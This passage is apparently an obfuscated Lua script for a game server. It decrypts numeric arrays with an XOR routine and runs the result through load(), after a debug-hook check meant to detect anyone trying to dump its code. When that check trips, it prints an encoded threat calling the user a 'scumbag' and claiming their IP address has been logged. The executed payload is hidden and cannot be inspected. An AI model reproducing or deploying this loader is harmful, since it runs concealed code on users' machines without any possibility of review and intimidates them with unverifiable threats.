                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; uwlWRFHY5GitjQd7NHlROkJRpcdxFl3dgiweqch1D7RZDfO4Z4dWGQMsATdp7Y9tQCNH(
{ 911, 1160, 1080, 677, 1206, 873, 785, 863, 812, 612, 1091, 891, 860, 685, 1111, 1090, 997, 543, 555, 1147, 1079, 959,
  640, 954, 841, 814, 876, 568, 1007, 915, 886, 577, 818, 872, 665, 1144, 877, 617, 546, 1065, 602, 624, 734, 1208, 862,
  1101, 1112, 1190, 1067, 890, 1046, 892, 800, 1137, 1203, 666, 1125, 978, 897, 1024, 832, 1055, 544, 1001, 593, 1138,
  963, 1089, 654, 952, 586, 553, 1032, 945, 1028, 1023, 756, 723, 899, 554, 686, 1005, 837, 712, 874, 688, 783, 1041,
  956, 605, 932, 957, 1015, 1152, 633, 742, 778, 902, 1040, 1161, 743, 805, 726, 1006, 824, 613, 829, 752, 864, 898, 857,
  974, 769, 781, 1054, 882, 1175, 679, 1143, 975, 659, 909, 724, 548, 884, 754, 1087, 1177, 1182, 1180, 644, 822, 795,
  1167, 1103, 962, 701, 790, 762, 621, 641, 1129, 928, 885, 744, 623, 619, 772, 913, 780, 791, 831, 569, 647, 1051, 918,
  573, 1013, 749, 1082, 671, 773, 717, 1029, 834, 620, 682, 741, 711, 1107, 656, 1132, 999, 991, 702, 614, 634, 1124,
  887, 973, 625, 1156, 1074, 673, 968, 948, 646, 1207, 943, 811, 1098, 590, 616, 1170, 1022, 1084, 1019, 931, 1044, 910,
  950, 691, 965, 980, 689, 1110, 1118, 1158, 709, 1014, 587, 1061, 738, 1021, 670, 1072, 683, 989, 637, 1131, 1211, 949,
  807, 710, 977, 859, 855, 606, 1096, 880, 1008, 600, 556, 784, 1122, 1052, 825, 618, 850, 867, 1193, 958, 1066, 926,
  853, 929, 1025, 1100, 567, 753, 1151, 565, 933, 879, 608, 986, 1202, 1056, 844, 1113, 731, 856, 967, 1209, 1128, 1083,
  585, 827, 1196, 1126, 1205, 1048, 849, 1020, 728, 993, 990, 1114, 970, 848, 1169, 680, 1178, 971, 564, 941, 559, 561,
  651, 934, 562, 919, 668, 699, 804, 579, 729, 1210, 1197, 725, 645, 1039, 684, 1026, 761, 1165, 1173, 1033, 760, 550,
  786, 603, 639, 1164, 610, 998, 632, 987, 1050, 1081, 1000, 1192, 914, 560, 960, 1102, 557, 765, 1123, 698, 858, 609,
  1036, 1116, 592, 693, 745, 964, 869, 746, 819, 703, 881, 1002, 1011, 1004, 552, 576, 604, 842, 1146, 846, 1130, 771,
  904, 1179, 1027, 636, 584, 627, 1073, 1069, 808, 1194, 582, 1077, 1159, 1086, 802, 758, 868, 669, 981, 944, 1017, 1016,
  759, 1038, 751, 735, 1099, 907, 888, 558, 1035, 638, 815, 1092, 1139, 1201, 801, 607, 797, 951, 1184, 1141, 674, 1085,
  714, 1199, 718, 1120, 935, 1070, 793, 736, 810, 658, 995, 1095, 912, 865, 883, 722, 1058, 927, 806, 574, 994, 681, 578,
  920, 1176, 687, 575, 1075, 996, 708, 730, 650, 547, 982, 983, 782, 571, 583, 1212, 788, 976, 648, 622, 692, 626, 1148,
  908, 653, 755, 737, 796, 774, 566, 1094, 643, 1109, 1076, 1105, 704, 1186, 700, 787, 947, 776, 1133, 1009, 1093, 1053,
  601, 777, 840, 611, 1064, 662, 942, 789, 570, 839, 598, 696, 766, 596, 901, 1200, 905, 875, 1171, 830, 675, 979, 1195,
  955, 1108, 551, 1166, 870, 838, 1117, 921, 1154, 1188, 1150, 1078, 1012, 1097, 1185, 836, 817, 580, 1003, 940, 1198,
  694, 816, 727, 823, 757, 1121, 721, 642, 835, 635, 763, 655, 599, 972, 597, 992, 1181, 847, 1062, 924, 930, 750, 1045,
  672, 917, 845, 843, 871, 1119, 747, 767, 985, -1, 75, 1, 46, 88, 90, 109, 0, 41, 108, 36, 46, 25, 17, 94, 74, 106, 30,
  29, 5, 82, 25, 29, 23, 43, 73, 26, 109, 105, 17, 248, 68, 127, 108, 18, 22, 22, 89, 114, 120, 18, 119, 75, 38, 94, 29,
  27, 90, 80, 26, 121, 38, 98, 196, 89, 88, 108, 17, 62, 71, 25, 58, 8, 21, 47, 1, 7, 106, 69, 92, 3, 18, 102, 109, 74,
  80, 107, 67, 80, 87, 86, 28, 85, 20, 88, 66, 237, 88, 190, 184, 78, 22, 76, 104, 106, 70, 13, 90, 44, 15, 101, 5, 124,
  95, 26, 107, 40, 23, 100, 14, 225, 74, 17, 85, 30, 34, 91, 17, 159, 37, 51, 250, 105, 108, 90, 161, 107, 92, 123, 17,
  104, 71, 39, 85, 141, 75, 125, 45, 5, 25, 85, 49, 95, 33, 75, 118, 36, 117, 218, 114, 104, 108, 80, 101, 87, 62, 24,
  118, 84, 101, 22, 92, 17, 139, 165, 190, 89, 78, 85, 117, 11, 115, 56, 135, 99, 127, 30, 50, 111, 60, 101, 111, 25,
  100, 93, 25, 92, 70, 114, 4, 180, 94, 17, 85, 20, 22, 5, 162, 86, 77, 20, 35, 88, 19, 85, 47, 58, 22, 45, 25, 95, 79,
  104, 66, 19, 4, 67, 114, 113, 69, 58, 86, 80, 92, 70, 5, 57, 41, 68, 85, 75, 81, 56, 126, 47, 45, 17, 60, 49, 87, 93,
  41, 0, 59, 65, 76, 1, 68, 118, 76, 72, 84, 46, 94, 32, 84, 67, 250, 86, 2, 22, 116, 98, 108, 25, 25, 80, 39, 69, 110,
  4, 226, 60, 43, 92, 89, 37, 69, 90, 219, 19, 41, 86, 65, 63, 59, 224, 88, 86, 83, 37, 130, 96, 57, 70, 88, 86, 118, 94,
  80, 115, 22, 80, 82, 100, 118, 57, 39, 83, 247, 4, 68, 139, 97, 28, 59, 17, 24, 0, 191, 83, 59, 22, 76, 73, 21, 110,
  16, 104, 17, 122, 11, 105, 85, 31, 4, 156, 35, 4, 78, 26, 123, 66, 52, 67, 97, 17, 37, 32, 9, 49, 139, 246, 151, 39,
  42, 2, 6, 124, 114, 109, 64, 17, 25, 199, 24, 17, 5, 31, 124, 73, 25, 7, 17, 131, 25, 111, 89, 68, 84, 168, 26, 48,
  113, 95, 44, 114, 17, 35, 82, 62, 87, 80, 104, 246, 51, 193, 159, 85, 56, 22, 122, 87, 93, 244, 69, 30, 78, 0, 75, 91,
  179, 34, 66, 3, 100, 51, 4, 55, 156, 15, 80, 33, 89, 184, 95, 8, 250, 84, 56, 92, 125, 51, 1, 54, 17, 5, 64, 69, 108,
  26, 85, 155, 6, 7, 16, 191, 94, 88, 10, 0, 19, 17, 89, 70, 84, 92, 8, 36, 89, 16, 100, 34, 25, 39, 95, 54, 88, 108,
  105, 118, 64, 82, 4, 89, 70, 23, 1, 54, 85, 96, 96, 61, 38, 91, 17, 126, 113, 170, 22, 14, 12, 218, 13, 75, 96, 100, 0,
  27, 4, 170, 33, 29, 117, 19, 251, 26, 203, 101, 31, 1, 53, 21, 25, 41, 122, 19, 67, 139, 30, 107, 203, 24, 100, 63, 54,
  19, 108, 35, 50, 113, 121, 81, 87, 51, 16, 105, 75, 84, 118, 21, 7, 119, 118, 4, 60, 158, 6, 0, 18, 108, 59, 89, 98,
  25, 108, 121, 17, 48, 98, 54, 22, 97, 54, 130, 104, 121, 17, 107, 72, 76, 61, 84, 133, 66, 85, 1, 59, 13, 6, 2, 59, 81,
  68, 4, 217, 24, 23, 25, 29, 68, 25, 78, 48, 151, 0, 44, 95, 42, 13, 70, 73, 20, 76, 114, 119, 91, 248, 110, 30, 93, 46,
  87, 105, 100, 105, 123, 17, 37, 14, 240, 109, 85, 35, 19, 75, 127, 68, 94, 84, 42, 4, 50, 32, 105, 34, 60, 24, 66, 101,
  87, 145, 22, 87, 25, 124, 82, 122, 14, 155, 18, 60, 39, 75, 99, 126, 26, 18, 100, 45, 42, 17, 233, 3, 80, 67, 91, 94,
  15, 61, 75 }, "vu196dIVLwfyRD9u181JkbYL3H"); uQKwL7yHpaI2UFGIBepqzjP2MU4VRFbGwDBG1cmVY5GVI26tUrcGIM4 =
efWt86ZDCgBaGY6cBlKCqlrlS68waJOSwYidl3xypzt5LVAwzhxmN66PynuodyEZq6hyrVWNnrf; hzkRZorESKMBwTbPxonOVjmEdWV30uxRzU6zUo5rrc0LtIJN6FH9EQmUvEFxiU9ZHOEW2UlSa8Y =
efWt86ZDCgBaGY6cBlKCqlrlS68waJOSwYidl3xypzt5LVAwzhxmN66PynuodyEZq6hyrVWNnrf; gvb0djEDaj2F1TOZsXxXLemQzyi3WKTq248BBT8SPTFukmLvRyFa6YgjsA =
hzkRZorESKMBwTbPxonOVjmEdWV30uxRzU6zUo5rrc0LtIJN6FH9EQmUvEFxiU9ZHOEW2UlSa8Y; gMEINDvUTwGWbIbNx2Idkds7yLYvl2PN2CqDgGROEi76yACccl89KZvpAKOdkpt =
gvb0djEDaj2F1TOZsXxXLemQzyi3WKTq248BBT8SPTFukmLvRyFa6YgjsA; hPpkAPcWqqKai0ilJabaFMUlrxLStAjzJHnGAMtiPfzFF8UeQZYBWV =
gMEINDvUTwGWbIbNx2Idkds7yLYvl2PN2CqDgGROEi76yACccl89KZvpAKOdkpt; mUKXyDmY6Qpx41BD4Q0bJ21ZyvuB9FzC62EzoWdBswAO6xuEL9cwXLuXGsv =
hPpkAPcWqqKai0ilJabaFMUlrxLStAjzJHnGAMtiPfzFF8UeQZYBWV; mL4BLEfXgYXrFrDGP0JKrmNY7UWHyUJCAAXhxaJhqOJsrjmNQ1Jhfr2amQQ076gAohSXRYhXw =
mUKXyDmY6Qpx41BD4Q0bJ21ZyvuB9FzC62EzoWdBswAO6xuEL9cwXLuXGsv; pvt9AHXl4XHNoAoLcFq21BjuL6RVSDDkdw7vntJRCdPZXCmglRrVoVTZTD6dh7L3LbRKkSjia =
mL4BLEfXgYXrFrDGP0JKrmNY7UWHyUJCAAXhxaJhqOJsrjmNQ1Jhfr2amQQ076gAohSXRYhXw; oAjEFzQtHD5hdfvxhtL5YJM7jseYZCBHFpllMfIGvl9jUrNKsbfD4lVWGaSUmHo =
pvt9AHXl4XHNoAoLcFq21BjuL6RVSDDkdw7vntJRCdPZXCmglRrVoVTZTD6dh7L3LbRKkSjia; hUjCBU28MVlJSaPFhdmMZOVwezDu2y2yraiLeJf6xLbi0V1l8EL0oXFi4e =
oAjEFzQtHD5hdfvxhtL5YJM7jseYZCBHFpllMfIGvl9jUrNKsbfD4lVWGaSUmHo; eBjwYn8Lp3DoNHyOoVgnNrYVqPIUmJLbpfCsBIWSdFGB6Vm30OmLKB67NaKQ =
hUjCBU28MVlJSaPFhdmMZOVwezDu2y2yraiLeJf6xLbi0V1l8EL0oXFi4e; g1LCL7INC52TYsbdlcORZIF1i3pP05TmNwvSEgS2Nt9oUO75aBNtPPhUxIq3rjYTUdIFE =
eBjwYn8Lp3DoNHyOoVgnNrYVqPIUmJLbpfCsBIWSdFGB6Vm30OmLKB67NaKQ; oC7Tqddwd0mp4VjNdnYOntPHmIMFJGBThowsr2jqhpMgjSqbAOf2NL9wRBfDd =
g1LCL7INC52TYsbdlcORZIF1i3pP05TmNwvSEgS2Nt9oUO75aBNtPPhUxIq3rjYTUdIFE; c08ZtSSqF2P2NPi4F51kDmfet8FlOYdOskl7NroGOrmYOnJsUy6ZxBrDNqo =
oC7Tqddwd0mp4VjNdnYOntPHmIMFJGBThowsr2jqhpMgjSqbAOf2NL9wRBfDd; ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1 = function(
  a)
  K, F = 7775721173569884, 16384 + 7333; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; a4vlgv9vAWmvV9RCbhnRvGvGDZmi1GpNgmx0cP245XTwsp5jNexIH = function(b)
  co = coroutine.create(b)
  kHSXYwydl3dgkgcM7MY4FA9lIXhwprp9yRIqmrePRh1jRLy25FSVwx = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(kHSXYwydl3dgkgcM7MY4FA9lIXhwprp9yRIqmrePRh1jRLy25FSVwx, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return kHSXYwydl3dgkgcM7MY4FA9lIXhwprp9yRIqmrePRh1jRLy25FSVwx
end; d4zTBUJgyQRURP5jukoUnYDoNQOJ54cH9ab0dxnOtEZjOrssRhkINx6NW48Te8yYJeNJiBEdRPQ = function(f, g)
  webd3sltgmuhssDq2Gi4H4dXoasRH2k8lHOimL2KdoJTIY0K6FVUHSUrENoi1zX6p1T17X4 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; b07eCK51TjrOp1n4JN6XAURbFCvgkuKmj2hNUnq3MzNGhYrfPwoEyipLNVIqXeiTcrI7F = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; bvIPZTP1zWdN1yAEPj7hEwLawwMD3IlKpPomzNG6wikI4yX37rCDy0xVdZcmL = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      webd3sltgmuhssDq2Gi4H4dXoasRH2k8lHOimL2KdoJTIY0K6FVUHSUrENoi1zX6p1T17X4(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; wNW4EI934fuIMek1E4YfRwP4B3YKqGbAGJ66z3CVSnoK9eBXVNm5rRwpyEmfbvsorNkrG = function(p, n)
    lrQnBZ2qKDiwvVE1Pc9qqpV1VbxSPOpd2EQ8b62lw0mn9WoySToEVo04kmuT0UT = ""
    for k, q in pairs(p) do lrQnBZ2qKDiwvVE1Pc9qqpV1VbxSPOpd2EQ8b62lw0mn9WoySToEVo04kmuT0UT =
      lrQnBZ2qKDiwvVE1Pc9qqpV1VbxSPOpd2EQ8b62lw0mn9WoySToEVo04kmuT0UT ..
      c08ZtSSqF2P2NPi4F51kDmfet8FlOYdOskl7NroGOrmYOnJsUy6ZxBrDNqo
      [ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B1') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B0') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B2') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('BB') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B6') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('BD')]
      [ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C1') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('BC') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C3') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B2')](
      q) end
    ; n(lrQnBZ2qKDiwvVE1Pc9qqpV1VbxSPOpd2EQ8b62lw0mn9WoySToEVo04kmuT0UT)
  end; b07eCK51TjrOp1n4JN6XAURbFCvgkuKmj2hNUnq3MzNGhYrfPwoEyipLNVIqXeiTcrI7F(f,
    function(r) bvIPZTP1zWdN1yAEPj7hEwLawwMD3IlKpPomzNG6wikI4yX37rCDy0xVdZcmL(r, g,
        function(s) wNW4EI934fuIMek1E4YfRwP4B3YKqGbAGJ66z3CVSnoK9eBXVNm5rRwpyEmfbvsorNkrG(s,
            function(t) if #a4vlgv9vAWmvV9RCbhnRvGvGDZmi1GpNgmx0cP245XTwsp5jNexIH(c08ZtSSqF2P2NPi4F51kDmfet8FlOYdOskl7NroGOrmYOnJsUy6ZxBrDNqo[ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B8') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B5') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C3') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C0')]) == 1 then if c08ZtSSqF2P2NPi4F51kDmfet8FlOYdOskl7NroGOrmYOnJsUy6ZxBrDNqo[ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B8') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B5') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C3') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C0')] == c08ZtSSqF2P2NPi4F51kDmfet8FlOYdOskl7NroGOrmYOnJsUy6ZxBrDNqo[ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B4') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B2') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('BB') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B6') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B0')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if c08ZtSSqF2P2NPi4F51kDmfet8FlOYdOskl7NroGOrmYOnJsUy6ZxBrDNqo[ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B8') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B5') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C3') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C0')](t) then
                    c08ZtSSqF2P2NPi4F51kDmfet8FlOYdOskl7NroGOrmYOnJsUy6ZxBrDNqo
                        [ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B8') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('B5') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C3') .. ae4rzismfvro9Zyt0YpI0qfO7BYHwqkj7YLwCh2BRuVLEqMd21vKxHgWXhGhB1('C0')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; d4zTBUJgyQRURP5jukoUnYDoNQOJ54cH9ab0dxnOtEZjOrssRhkINx6NW48Te8yYJeNJiBEdRPQ(
{ 1128, 912, 777, 1009, 1047, 1037, 890, 1118, 1088, 1046, 834, 925, 941, 1094, 584, 1059, 787, 1184, 1068, 858, 794,
  1159, 898, 1105, 623, 1003, 720, 603, 826, 1032, 819, 980, 953, 1162, 936, 967, 613, 598, 648, 873, 565, 958, 1005,
  1070, 663, 548, 1017, 612, 630, 765, 673, 1080, 717, 769, 587, 879, 1089, 849, 1176, 1019, 1178, 658, 547, 1071, 784,
  1131, 678, 1092, 572, 856, 994, 757, 831, 1039, 685, 669, 1023, 934, 571, 1021, 676, 1083, 1048, 1034, 928, 1165, 1148,
  1140, 730, 679, 1045, 1114, 732, 726, 908, 739, 709, 719, 951, 1205, 754, 992, 753, 946, 984, 638, 771, 783, 836, 772,
  570, 758, 619, 1180, 727, 625, 1185, 904, 1014, 872, 885, 852, 918, 763, 887, 1195, 675, 1126, 844, 1002, 1069, 798,
  581, 868, 853, 644, 805, 688, 969, 1208, 737, 1200, 949, 955, 716, 828, 991, 802, 846, 842, 1134, 654, 914, 1063, 830,
  714, 1066, 1144, 651, 832, 1211, 742, 1029, 1031, 937, 1001, 715, 738, 1204, 786, 814, 1050, 788, 975, 634, 626, 998,
  555, 628, 883, 645, 1194, 575, 649, 1190, 740, 718, 756, 616, 1158, 632, 1081, 886, 670, 1183, 601, 621, 729, 629,
  1187, 775, 702, 576, 907, 652, 778, 637, 1018, 840, 1067, 692, 713, 592, 902, 1196, 988, 838, 762, 1082, 745, 961, 910,
  1042, 966, 1054, 735, 681, 1028, 596, 1040, 1086, 1109, 1103, 905, 1098, 1072, 973, 561, 636, 876, 1149, 661, 970,
  1127, 606, 734, 897, 801, 1097, 930, 1138, 920, 822, 932, 843, 924, 1041, 1150, 551, 1168, 699, 1030, 1051, 1172, 1199,
  916, 1154, 589, 582, 566, 1049, 1146, 971, 1169, 1189, 963, 894, 956, 1085, 1116, 1025, 1197, 862, 804, 695, 751, 977,
  854, 706, 588, 810, 760, 605, 604, 999, 1193, 635, 1074, 722, 617, 620, 1160, 903, 957, 833, 1115, 614, 923, 700, 1052,
  779, 1010, 563, 668, 895, 807, 996, 820, 950, 948, 1174, 823, 558, 1120, 564, 803, 866, 579, 680, 827, 796, 1016, 665,
  639, 1053, 816, 899, 1020, 746, 650, 687, 795, 686, 615, 1110, 1163, 799, 752, 1035, 594, 1175, 1164, 1141, 749, 1209,
  1123, 942, 698, 1129, 1036, 1130, 848, 1076, 773, 708, 697, 559, 622, 964, 543, 913, 835, 562, 725, 806, 892, 549, 917,
  1112, 721, 1121, 821, 812, 595, 567, 919, 1206, 1137, 900, 896, 871, 677, 672, 744, 1122, 1192, 926, 1152, 1151, 770,
  891, 877, 1173, 859, 1012, 922, 888, 851, 1099, 684, 1056, 557, 591, 818, 817, 674, 1119, 1179, 857, 701, 747, 646,
  829, 1100, 797, 766, 1077, 580, 1024, 997, 954, 759, 1108, 750, 552, 1170, 1139, 938, 989, 1181, 1157, 1145, 1043, 800,
  882, 1166, 1202, 1188, 921, 743, 736, 627, 1078, 1087, 792, 602, 841, 693, 863, 577, 728, 682, 959, 979, 1171, 982,
  1156, 976, 574, 1065, 968, 940, 690, 845, 583, 927, 1084, 1022, 909, 1006, 611, 1000, 641, 689, 631, 660, 755, 1191,
  960, 860, 1096, 655, 573, 1011, 1177, 585, 889, 945, 705, 691, 1015, 947, 1101, 553, 671, 724, 870, 560, 664, 850,
  1057, 1111, 1104, 599, 1143, 640, 847, 683, 733, 1060, 901, 839, 837, 1079, 1090, 544, 861, 878, 944, 1132, 590, 659,
  1061, 624, 642, 618, 815, 884, 781, 1093, 707, 748, -1, 31, 92, 61, 70, 85, 70, 114, 87, 87, 23, 118, 147, 94, 207, 67,
  83, 24, 111, 6, 81, 77, 55, 115, 37, 43, 159, 164, 30, 17, 99, 20, 73, 70, 127, 56, 20, 99, 120, 87, 94, 76, 34, 98,
  236, 24, 61, 62, 119, 97, 99, 183, 82, 78, 63, 15, 113, 13, 46, 124, 61, 45, 115, 78, 16, 32, 158, 148, 100, 114, 1,
  80, 34, 76, 95, 111, 109, 20, 53, 107, 105, 87, 99, 59, 66, 120, 123, 111, 44, 38, 68, 203, 16, 18, 53, 6, 37, 77, 9,
  115, 115, 63, 83, 19, 24, 44, 88, 112, 98, 31, 111, 61, 92, 114, 3, 48, 56, 12, 34, 54, 141, 85, 63, 109, 102, 77, 98,
  126, 127, 18, 93, 20, 83, 38, 66, 54, 58, 52, 73, 103, 11, 123, 70, 100, 40, 76, 115, 106, 112, 50, 20, 38, 249, 26,
  189, 39, 78, 19, 107, 116, 86, 248, 56, 52, 7, 35, 5, 23, 36, 178, 219, 115, 16, 1, 50, 65, 124, 73, 8, 106, 126, 44,
  120, 118, 98, 65, 67, 109, 87, 205, 110, 62, 48, 108, 22, 91, 108, 96, 115, 239, 13, 61, 38, 60, 7, 112, 9, 106, 41,
  71, 51, 90, 57, 83, 31, 10, 54, 37, 5, 43, 127, 73, 137, 62, 118, 252, 132, 55, 51, 81, 94, 88, 80, 6, 145, 93, 117,
  70, 6, 61, 43, 50, 38, 189, 99, 38, 122, 202, 23, 31, 51, 65, 109, 49, 23, 81, 36, 25, 108, 59, 63, 61, 38, 64, 18, 49,
  31, 248, 52, 4, 23, 147, 116, 100, 114, 20, 123, 37, 76, 108, 81, 51, 174, 106, 86, 108, 35, 76, 24, 40, 120, 67, 70,
